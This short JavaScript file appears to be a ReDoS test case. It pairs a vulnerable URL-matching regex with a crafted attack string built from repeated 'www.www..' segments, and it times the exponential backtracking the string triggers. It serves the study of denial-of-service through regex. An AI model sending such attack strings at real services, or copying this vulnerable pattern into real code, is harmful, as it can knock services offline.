/* 8038
 * ^(http\://){1}(((www\.){1}([a-zA-Z0-9\-]*\.){1,}){1}|([a-zA-Z0-9\-]*\.){1,10}){1}([a-zA-Z]{2,6}\.){1}([a-zA-Z0-9\-\._\?\,\'/\\\+&amp;%\$#\=~])*
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:"http://www.."+"www.www.."*1024+"! _1_EOD(i2)"
 */
var REGEX = new RegExp("^(http\://){1}(((www\.){1}([a-zA-Z0-9\-]*\.){1,}){1}|([a-zA-Z0-9\-]*\.){1,10}){1}([a-zA-Z]{2,6}\.){1}([a-zA-Z0-9\-\._\?\,\'/\\\+&amp;%\$#\=~])*")
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = 'http://www..' + 'www.www..'.repeat(i*1) + '! _1_EOD(i2)'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}